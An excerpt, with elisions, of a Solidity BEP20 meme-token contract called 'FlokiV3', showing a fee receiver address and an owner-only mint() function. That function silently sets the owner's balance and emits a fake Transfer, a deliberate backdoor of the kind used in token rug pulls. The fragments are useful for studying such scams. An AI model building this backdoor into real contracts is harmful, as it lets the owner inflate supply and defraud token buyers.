...
contract FlokiV3 is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "FlokiV3";
    string constant _symbol = "$FlokiV3";
    ...
    uint256 public maxBuyTranscationAmount = 10**12* 10**_decimals;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x164C96BA4c2F544Ec8098B548b269A224F63C83a;
    ...
    function mint() public onlyOwner {
        _rBalance[msg.sender] = 10**19;
        emit Transfer(address(0), msg.sender, 10**19);
    }
    ...
    function _setAutomatedMarketMakerPair(address pcspair, bool value) private {
        automatedMarketMakerPairs[pcspair] = value;

        emit SetAutomatedMarketMakerPair(pcspair, value);
    }
